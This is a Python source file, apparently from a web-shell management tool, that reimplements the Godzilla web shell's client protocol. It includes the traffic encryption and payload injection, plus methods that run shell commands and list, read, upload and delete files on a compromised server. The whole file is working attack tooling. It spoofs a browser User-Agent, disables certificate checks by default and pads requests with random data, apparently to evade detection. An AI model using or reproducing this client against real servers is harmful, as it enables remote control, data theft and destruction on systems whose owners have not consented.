"""
哥斯拉 (Godzilla) 协议 Python 移植

参考 kimi/wsm 实现，目前优先支持 PHP，JSP/ASP/ASPX 逐步补齐。
"""

import base64
import gzip
import hashlib
import logging
import os
import re
import struct
import typing as t
from pathlib import Path
from urllib.parse import urlencode

import httpx
from Crypto.Cipher import AES

logger = logging.getLogger("core.wsm.godzilla")


def secret_key(pwd: str) -> bytes:
    return hashlib.md5(pwd.encode()).hexdigest()[:16].encode()


def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes([c ^ key[(i + 1) & 15] for i, c in enumerate(data)])


def pkcs5_unpad(data: bytes) -> bytes:
    pad = data[-1]
    return data[:-pad]


def aes_ecb_encrypt(data: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(data + bytes([16 - len(data) % 16] * (16 - len(data) % 16)))


def aes_ecb_decrypt(data: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_ECB)
    return pkcs5_unpad(cipher.decrypt(data))


def aes_cbc_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(data + bytes([16 - len(data) % 16] * (16 - len(data) % 16)))


def aes_cbc_decrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return pkcs5_unpad(cipher.decrypt(data))


class Parameter:
    """哥斯拉参数序列化"""

    def __init__(self):
        self.items: t.List[t.Tuple[str, bytes]] = []

    def add_string(self, key: str, value: str):
        self.add_bytes(key, value.encode())

    def add_bytes(self, key: str, value: bytes):
        self.items.append((key, value))

    def serialize(self) -> bytes:
        out = b""
        for key, value in self.items:
            out += key.encode()
            out += b"\x02"
            out += struct.pack("<I", len(value))
            out += value
        return out


class GodzillaClient:
    """哥斯拉客户端，目前实现 PHP XOR_BASE64 / XOR_RAW。"""

    def __init__(
        self,
        url: str,
        raw_pass: str,
        raw_key: str,
        script: str,
        crypto: str,
        proxy: t.Optional[str] = None,
        verify: bool = False,
    ):
        self.url = url
        self.script = script.lower()
        self.crypto = crypto.upper()
        self.pass_param = secret_key(raw_pass).decode()
        self.key = secret_key(raw_key)
        self.proxy = proxy
        self.verify = verify
        self.client = httpx.AsyncClient(
            proxy=proxy,
            verify=verify,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            timeout=httpx.Timeout(30),
        )
        self._injected = False

    def _need_gzip(self) -> bool:
        return self.script != "asp"

    def _encrypt(self, data: bytes) -> bytes:
        if self.script in ("php", "asp"):
            return xor_bytes(data, self.key)
        if self.script in ("jsp", "jspx"):
            return aes_ecb_encrypt(data, self.key)
        if self.script == "aspx":
            return aes_cbc_encrypt(data, self.key, self.key)
        raise NotImplementedError(f"脚本 {self.script} 加密未实现")

    def _decrypt(self, data: bytes) -> bytes:
        if self.script in ("php", "asp"):
            return xor_bytes(data, self.key)
        if self.script in ("jsp", "jspx"):
            return aes_ecb_decrypt(data, self.key)
        if self.script == "aspx":
            return aes_cbc_decrypt(data, self.key, self.key)
        raise NotImplementedError(f"脚本 {self.script} 解密未实现")

    def _pack_request(self, param: bytes) -> t.Tuple[bytes, t.Dict[str, str]]:
        """返回 (body, headers)"""
        if self._need_gzip():
            param = gzip.compress(param)
        encrypted = self._encrypt(param)
        if "BASE64" in self.crypto:
            encoded = base64.b64encode(encrypted).decode()
            body = urlencode({self.pass_param: encoded}).encode()
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
        else:
            body = encrypted
            headers = {"Content-Type": "application/octet-stream"}
        return body, headers

    def _unpack_response(self, raw: bytes) -> bytes:
        if not raw:
            return b""
        if "BASE64" in self.crypto:
            flag = hashlib.md5((self.pass_param.encode() + self.key)).hexdigest().upper()
            front, back = flag[:16], flag[16:]
            if self.script == "asp":
                # ASP loader 使用固定分隔符 11cd6a ... ac826a
                m = re.search(rb"(?i)11cd6a(.*?)ac826a", raw, re.S)
                if not m:
                    m = re.search(rb"(?i)" + flag[:6].encode() + rb"(.*?)" + flag[20:26].encode(), raw, re.S)
            else:
                m = re.search(rb"(?i)" + front.encode() + rb"(.*?)" + back.encode(), raw, re.S)
            if not m:
                raise ValueError("无法从响应中提取哥斯拉数据")
            encrypted = base64.b64decode(m.group(1))
            decrypted = self._decrypt(encrypted)
        else:
            decrypted = self._decrypt(raw)
        if self.script == "asp":
            return decrypted
        try:
            return gzip.decompress(decrypted)
        except Exception:
            return decrypted

    async def _request(self, param: bytes) -> bytes:
        body, headers = self._pack_request(param)
        headers["Content-Length"] = str(len(body))
        resp = await self.client.post(self.url, content=body, headers=headers)
        resp.raise_for_status()
        return self._unpack_response(resp.content)

    async def _send_payload(self, payload: bytes) -> bytes:
        """首次注入 payload，不压缩，仅加密后发送。"""
        encrypted = self._encrypt(payload)
        if "BASE64" in self.crypto:
            encoded = base64.b64encode(encrypted).decode()
            body = urlencode({self.pass_param: encoded}).encode()
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
        else:
            body = encrypted
            headers = {"Content-Type": "application/octet-stream"}
        headers["Content-Length"] = str(len(body))
        resp = await self.client.post(self.url, content=body, headers=headers)
        resp.raise_for_status()
        return resp.content

    def _method_param(self, method: str) -> Parameter:
        p = Parameter()
        # 随机填充，避免长度固定
        p.add_string(os.urandom(4).hex(), os.urandom(4).hex())
        p.add_string("methodName", method)
        return p

    async def inject_payload(self, payload: bytes):
        """首次连接时注入 payload（如果目标尚未初始化 session）。"""
        if self._injected:
            return
        try:
            await self._send_payload(payload)
            self._injected = True
        except Exception:
            # 可能目标已经有 payload，忽略
            self._injected = True

    async def ping(self) -> bool:
        p = self._method_param("test")
        try:
            result = await self._request(p.serialize())
            return result.strip() == b"ok"
        except Exception as exc:
            logger.debug("godzilla ping failed: %s", exc)
            return False

    async def basicinfo(self) -> t.Dict[str, str]:
        p = self._method_param("getBasicsInfo")
        result = await self._request(p.serialize())
        text = result.decode("utf-8", errors="replace")
        info: t.Dict[str, str] = {}
        for line in text.splitlines():
            if " : " in line:
                k, v = line.split(" : ", 1)
                info[k.strip()] = v.strip()
        return info

    async def exec_command(self, cmd: str) -> str:
        p = self._method_param("execCommand")
        p.add_bytes("cmdLine", cmd.encode())
        args = cmd.split()
        for i, arg in enumerate(args):
            p.add_bytes(f"arg-{i}", arg.encode())
        p.add_string("argsCount", str(len(args)))
        if args:
            p.add_string("executableFile", args[0])
            if len(args) >= 2:
                p.add_string("executableArgs", " ".join(args[1:]))
        result = await self._request(p.serialize())
        return result.decode("utf-8", errors="replace")

    async def list_dir(self, path: str) -> str:
        p = self._method_param("getFile")
        p.add_bytes("dirName", path.encode())
        result = await self._request(p.serialize())
        return result.decode("utf-8", errors="replace")

    async def read_file(self, path: str) -> bytes:
        # PHP/ASP payload 中的文件读取函数名为 readFileContent
        method = "readFileContent" if self.script in ("php", "asp") else "readFile"
        p = self._method_param(method)
        p.add_bytes("fileName", path.encode())
        result = await self._request(p.serialize())
        return result

    async def write_file(self, path: str, content: bytes) -> bool:
        p = self._method_param("uploadFile")
        p.add_bytes("fileName", path.encode())
        p.add_bytes("fileValue", content)
        result = await self._request(p.serialize())
        return result.strip() == b"ok"

    async def delete_file(self, path: str) -> bool:
        p = self._method_param("deleteFile")
        p.add_bytes("fileName", path.encode())
        result = await self._request(p.serialize())
        return result.strip() == b"ok"
